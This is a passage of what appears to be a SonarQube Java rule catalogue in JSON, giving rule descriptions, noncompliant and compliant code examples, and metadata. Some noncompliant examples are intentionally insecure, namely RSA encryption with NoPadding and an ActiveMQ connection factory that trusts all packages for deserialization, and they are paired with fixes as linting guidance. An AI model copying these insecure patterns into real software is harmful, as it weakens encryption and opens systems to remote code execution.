            "mdDesc": "<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an\nissue as soon as a literal value starts with <code>RSA/NONE</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher rsa = javax.crypto.Cipher.getInstance(\"RSA/NONE/NoPadding\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCipher rsa = javax.crypto.Cipher.getInstance(\"RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/780.html\">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING\">RSA NoPadding Unsafe</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5542} instead.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S2274",
            "repo": "java",
            "name": "\"Object.wait(...)\" and \"Condition.await(...)\" should be called inside a \"while\" loop",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the documentation of the Java <code>Condition</code> interface:</p>\n<blockquote>\n  <p>When waiting upon a <code>Condition</code>, a \"spurious wakeup\" is permitted to occur, in general, as a concession to the underlying platform\n  semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state\n  predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications\n  programmers always assume that they can occur and so always wait in a loop.</p>\n</blockquote>\n<p>The same advice is also found for the <code>Object.wait(...)</code> method:</p>\n<blockquote>\n  <p>waits should always occur in loops, like this one:</p>\n  <pre>\nsynchronized (obj) {\n  while (&lt;condition does not hold&gt;){\n    obj.wait(timeout);\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\nsynchronized (obj) {\n  if (!suitableCondition()){\n    obj.wait(timeout);   //the thread can wake up even if the condition is still false\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsynchronized (obj) {\n  while (!suitableCondition()){\n    obj.wait(timeout);\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/EzdGBQ\">CERT THI03-J.</a> - Always invoke wait() and await() methods inside a loop </li>\n</ul>",
            "mdDesc": "<p>According to the documentation of the Java <code>Condition</code> interface:</p>\n<blockquote>\n  <p>When waiting upon a <code>Condition</code>, a \"spurious wakeup\" is permitted to occur, in general, as a concession to the underlying platform\n  semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state\n  predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications\n  programmers always assume that they can occur and so always wait in a loop.</p>\n</blockquote>\n<p>The same advice is also found for the <code>Object.wait(...)</code> method:</p>\n<blockquote>\n  <p>waits should always occur in loops, like this one:</p>\n  <pre>\nsynchronized (obj) {\n  while (&lt;condition does not hold&gt;){\n    obj.wait(timeout);\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\nsynchronized (obj) {\n  if (!suitableCondition()){\n    obj.wait(timeout);   //the thread can wake up even if the condition is still false\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsynchronized (obj) {\n  while (!suitableCondition()){\n    obj.wait(timeout);\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/EzdGBQ\">CERT THI03-J.</a> - Always invoke wait() and await() methods inside a loop </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5786",
            "repo": "java",
            "name": "JUnit5 test classes and methods should have default package visibility",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>JUnit5 is more tolerant regarding the visibilities of Test classes than JUnit4, which required everything to be <code>public</code>.</p>\n<p>In this context, JUnit5 test classes can have any visibility but <code>private</code>, however, it is recommended to use the default package\nvisibility, which improves readability of code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\npublic class MyClassTest { // Noncompliant - modifier can be removed\n  @Test\n  protected void test() { // Noncompliant - modifier can be removed\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  void test() {\n    // ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule does not raise an issue about <code>private</code> visibility, because <code>private</code> test methods and classes are systematically\nignored by JUnit5, without a proper warning. It's not a <code>Code Smell</code> but a <code>Bug</code> handled by the rule <a href='/coding_rules#rule_key=java%3AS5810'>S5810</a>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#writing-tests-classes-and-methods\">JUnit 5 Test Classes and Methods</a> </li>\n</ul>",
            "mdDesc": "<p>JUnit5 is more tolerant regarding the visibilities of Test classes than JUnit4, which required everything to be <code>public</code>.</p>\n<p>In this context, JUnit5 test classes can have any visibility but <code>private</code>, however, it is recommended to use the default package\nvisibility, which improves readability of code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\npublic class MyClassTest { // Noncompliant - modifier can be removed\n  @Test\n  protected void test() { // Noncompliant - modifier can be removed\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  void test() {\n    // ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule does not raise an issue about <code>private</code> visibility, because <code>private</code> test methods and classes are systematically\nignored by JUnit5, without a proper warning. It's not a <code>Code Smell</code> but a <code>Bug</code> handled by the rule {rule:java:S5810}.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#writing-tests-classes-and-methods\">JUnit 5 Test Classes and Methods</a> </li>\n</ul>",
            "severity": "INFO",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1065",
            "repo": "java",
            "name": "Unused labels should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>\n<p>This will improve maintainability as developers will not wonder what this label is used for.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo() {\n  outer: //label is not used.\n  for(int i = 0; i&lt;10; i++) {\n    break;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo() {\n  for(int i = 0; i&lt;10; i++) {\n    break;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "mdDesc": "<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>\n<p>This will improve maintainability as developers will not wonder what this label is used for.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo() {\n  outer: //label is not used.\n  for(int i = 0; i&lt;10; i++) {\n    break;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo() {\n  for(int i = 0; i&lt;10; i++) {\n    break;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5665",
            "repo": "java",
            "name": "Escape sequences should not be used in text blocks",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of escape sequences is mostly unnecessary in text blocks.</p>\n<h2>Noncompliant Code Example</h2>\n<p><code>\\n</code> can be replaced by simply introducing the newline, <code>\\\"\\\"\\\"</code> it is sufficient to escape only the first qoute.</p>\n<pre>\nString textBlock = \"\"\"\n        \\\"\\\"\\\" this \\nis\n        text  block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString textBlock = \"\"\"\n        \\\"\"\" this\n        is\n        text  block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "mdDesc": "<p>The use of escape sequences is mostly unnecessary in text blocks.</p>\n<h2>Noncompliant Code Example</h2>\n<p><code>\\n</code> can be replaced by simply introducing the newline, <code>\\\"\\\"\\\"</code> it is sufficient to escape only the first qoute.</p>\n<pre>\nString textBlock = \"\"\"\n        \\\"\\\"\\\" this \\nis\n        text  block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString textBlock = \"\"\"\n        \\\"\"\" this\n        is\n        text  block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java14"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1186",
            "repo": "java",
            "name": "Methods should not be empty",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There are several reasons for a method not to have a method body:</p>\n<ul>\n  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>\n  <li> It is not yet, or never will be, supported. In this case an <code>UnsupportedOperationException</code> should be thrown. </li>\n  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething() {\n}\n\npublic void doSomethingElse() {\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic void doSomething() {\n  // Do nothing because of X and Y.\n}\n\n@Override\npublic void doSomethingElse() {\n  throw new UnsupportedOperationException();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Default (no-argument) constructors are ignored when there are other constructors in the class, as are empty methods in abstract classes.</p>\n<pre>\npublic abstract class Animal {\n  void speak() {  // default implementation ignored\n  }\n}\n</pre>",
            "mdDesc": "<p>There are several reasons for a method not to have a method body:</p>\n<ul>\n  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>\n  <li> It is not yet, or never will be, supported. In this case an <code>UnsupportedOperationException</code> should be thrown. </li>\n  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething() {\n}\n\npublic void doSomethingElse() {\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic void doSomething() {\n  // Do nothing because of X and Y.\n}\n\n@Override\npublic void doSomethingElse() {\n  throw new UnsupportedOperationException();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Default (no-argument) constructors are ignored when there are other constructors in the class, as are empty methods in abstract classes.</p>\n<pre>\npublic abstract class Animal {\n  void speak() {  // default implementation ignored\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2153",
            "repo": "java",
            "name": "Boxing and unboxing should not be immediately reversed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Boxing is the process of putting a primitive value into an analogous object, such as creating an <code>Integer</code> to hold an <code>int</code>\nvalue. Unboxing is the process of retrieving the primitive value from such an object.</p>\n<p>Since the original value is unchanged during boxing and unboxing, there's no point in doing either when not needed. This also applies to autoboxing\nand auto-unboxing (when Java implicitly handles the primitive/object transition for you).</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void examineInt(int a) {\n  //...\n}\n\npublic void examineInteger(Integer a) {\n  // ...\n}\n\npublic void func() {\n  int i = 0;\n  Integer iger1 = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = new Double(d).intValue(); // Noncompliant\n\n  examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox\n  examineInt(Integer.valueOf(i));  // Noncompliant; boxed int will be auto-unboxed\n\n  examineInteger(i); // Compliant; value is boxed but not then unboxed\n  examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed\n\n  Integer iger2 = new Integer(iger1); // Noncompliant; unnecessary unboxing, value can be reused\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void examineInt(int a) {\n  //...\n}\n\npublic void examineInteger(Integer a) {\n  // ...\n}\n\npublic void func() {\n  int i = 0;\n  Integer iger1 = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = (int) d;\n\n  examineInt(i);\n\n  examineInteger(i);\n  examineInteger(iger1);\n}\n</pre>",
            "mdDesc": "<p>Boxing is the process of putting a primitive value into an analogous object, such as creating an <code>Integer</code> to hold an <code>int</code>\nvalue. Unboxing is the process of retrieving the primitive value from such an object.</p>\n<p>Since the original value is unchanged during boxing and unboxing, there's no point in doing either when not needed. This also applies to autoboxing\nand auto-unboxing (when Java implicitly handles the primitive/object transition for you).</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void examineInt(int a) {\n  //...\n}\n\npublic void examineInteger(Integer a) {\n  // ...\n}\n\npublic void func() {\n  int i = 0;\n  Integer iger1 = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = new Double(d).intValue(); // Noncompliant\n\n  examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox\n  examineInt(Integer.valueOf(i));  // Noncompliant; boxed int will be auto-unboxed\n\n  examineInteger(i); // Compliant; value is boxed but not then unboxed\n  examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed\n\n  Integer iger2 = new Integer(iger1); // Noncompliant; unnecessary unboxing, value can be reused\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void examineInt(int a) {\n  //...\n}\n\npublic void examineInteger(Integer a) {\n  // ...\n}\n\npublic void func() {\n  int i = 0;\n  Integer iger1 = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = (int) d;\n\n  examineInt(i);\n\n  examineInteger(i);\n  examineInteger(iger1);\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3242",
            "repo": "java",
            "name": "Method parameters should be declared with base types",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>For maximum reusability, methods should accept parameters with as little specialization as possible. So unless specific features from a child class\nare required by a method, a type higher up the class hierarchy should be used instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void printSize(ArrayList&lt;Object&gt; list) {  // Collection can be used instead\n    System.out.println(list.size());\n}\n\npublic static void loop(List&lt;Object&gt; list) { // java.lang.Iterable can be used instead\n   for (Object o : list) {\n     o.toString();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void printSize(Collection&lt;?&gt; list) {  // Collection can be used instead\n    System.out.println(list.size());\n}\n\npublic static void loop(Iterable&lt;?&gt; list) { // java.lang.Iterable can be used instead\n   for (Object o : list) {\n     o.toString();\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Parameters in non-public methods are not checked, because such methods are not intended to be generally reusable. <code>java.lang.String</code>\nparameters are excluded, because String is immutable and can not be always substituted for more generic type. Parameters used in any other context\nthan method invocation or enhanced for loop are also excluded.</p>",
            "mdDesc": "<p>For maximum reusability, methods should accept parameters with as little specialization as possible. So unless specific features from a child class\nare required by a method, a type higher up the class hierarchy should be used instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void printSize(ArrayList&lt;Object&gt; list) {  // Collection can be used instead\n    System.out.println(list.size());\n}\n\npublic static void loop(List&lt;Object&gt; list) { // java.lang.Iterable can be used instead\n   for (Object o : list) {\n     o.toString();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void printSize(Collection&lt;?&gt; list) {  // Collection can be used instead\n    System.out.println(list.size());\n}\n\npublic static void loop(Iterable&lt;?&gt; list) { // java.lang.Iterable can be used instead\n   for (Object o : list) {\n     o.toString();\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Parameters in non-public methods are not checked, because such methods are not intended to be generally reusable. <code>java.lang.String</code>\nparameters are excluded, because String is immutable and can not be always substituted for more generic type. Parameters used in any other context\nthan method invocation or enhanced for loop are also excluded.</p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "api-design"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5301",
            "repo": "java",
            "name": "\"ActiveMQConnectionFactory\" should not be vulnerable to malicious code deserialization",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>ActiveMQ can send/receive JMS Object messages (named ObjectMessage in ActiveMQ context) to comply with JMS specification. Internally, ActiveMQ\nrelies on Java serialization mechanism for marshaling/unmashaling of the message payload. Deserialization based on data supplied by the user could\nlead to remote code execution attacks, where the structure of the serialized data is changed to modify the behavior of the object being\nunserialized.</p>\n<p>To limit the risk to be victim of such attack, ActiveMQ 5.12.2+ enforces developers to explicitly whitelist packages that can be exchanged using\nObjectMessages.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustAllPackages(true); // Noncompliant\n\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\n// no call to factory.setTrustedPackages(...);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustedPackages(Arrays.asList(\"org.mypackage1\", \"org.mypackage2\"));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://activemq.apache.org/objectmessage.html\">ActiveMQ ObjectMessage Security Advisory</a> </li>\n  <li> <a href=\"https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt\">CVE-2015-5254</a> </li>\n</ul>",
            "mdDesc": "<p>ActiveMQ can send/receive JMS Object messages (named ObjectMessage in ActiveMQ context) to comply with JMS specification. Internally, ActiveMQ\nrelies on Java serialization mechanism for marshaling/unmashaling of the message payload. Deserialization based on data supplied by the user could\nlead to remote code execution attacks, where the structure of the serialized data is changed to modify the behavior of the object being\nunserialized.</p>\n<p>To limit the risk to be victim of such attack, ActiveMQ 5.12.2+ enforces developers to explicitly whitelist packages that can be exchanged using\nObjectMessages.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustAllPackages(true); // Noncompliant\n\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\n// no call to factory.setTrustedPackages(...);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustedPackages(Arrays.asList(\"org.mypackage1\", \"org.mypackage2\"));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://activemq.apache.org/objectmessage.html\">ActiveMQ ObjectMessage Security Advisory</a> </li>\n  <li> <a href=\"https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt\">CVE-2015-5254</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S5785",
            "repo": "java",
            "name": "JUnit assertTrue/assertFalse should be simplified to the corresponding dedicated assertion",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Testing equality or nullness with JUnit's <code>assertTrue()</code> or <code>assertFalse()</code> should be simplified to the corresponding\ndedicated assertion.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nAssert.assertTrue(a.equals(b));\nAssert.assertTrue(a == b);\nAssert.assertTrue(a == null);\nAssert.assertTrue(a != null);\nAssert.assertFalse(a.equals(b));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nAssert.assertEquals(a, b);\nAssert.assertSame(a, b);\nAssert.assertNull(a);\nAssert.assertNotNull(a);\nAssert.assertNotEquals(a, b);\n</pre>",
            "mdDesc": "<p>Testing equality or nullness with JUnit's <code>assertTrue()</code> or <code>assertFalse()</code> should be simplified to the corresponding\ndedicated assertion.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nAssert.assertTrue(a.equals(b));\nAssert.assertTrue(a == b);\nAssert.assertTrue(a == null);\nAssert.assertTrue(a != null);\nAssert.assertFalse(a.equals(b));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nAssert.assertEquals(a, b);\nAssert.assertSame(a, b);\nAssert.assertNull(a);\nAssert.assertNotNull(a);\nAssert.assertNotEquals(a, b);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2275",
            "repo": "java",
            "name": "Printf-style format strings should not lead to unexpected behavior at runtime",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors\nthat lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling\nthe <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code>,\n<code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code>\nor <code>java.io.PrintWriter</code> classes. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString.format(\"The value of my integer is %d\", \"Hello World\");  // Noncompliant; an 'int' is expected rather than a String\nString.format(\"Duke's Birthday year is %tX\", c);  //Noncompliant; X is not a supported time conversion character\nString.format(\"Display %0$d and then %d\", 1);   //Noncompliant; arguments are numbered starting from 1\nString.format(\"Not enough arguments %d and %d\", 1);  //Noncompliant; the second argument is missing\nString.format(\"%&lt; is equals to %d\", 2);   //Noncompliant; the argument index '&lt;' refers to the previous format specifier but there isn't 